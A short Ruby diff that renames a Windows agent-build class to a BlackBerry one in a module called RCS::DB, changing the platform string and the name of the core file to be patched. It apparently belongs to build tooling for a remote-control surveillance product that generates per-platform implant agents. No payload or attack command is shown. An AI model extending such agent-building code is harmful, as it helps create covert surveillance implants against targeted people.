@@ -1,5 +1,5 @@
 #
-#  Agent creation for windows
+#  Agent creation for blackberry
 #
 
 # from RCS::Common
@@ -8,11 +8,11 @@ require 'rcs-common/trace'
 module RCS
 module DB
 
-class BuildWindows < Build
+class BuildBlackberry < Build
 
   def initialize
     super
-    @platform = 'windows'
+    @platform = 'blackberry'
   end
 
   def patch(params)
@@ -21,7 +21,7 @@ class BuildWindows < Build
 
     # add the file to be patched to the params
     # these params will be passed to the super
-    params[:core] = 'core'
+    params[:core] = 'net_rim_bb_lib_base'
     params[:config] = 'config'
 
     # invoke the generic patch method with the new params
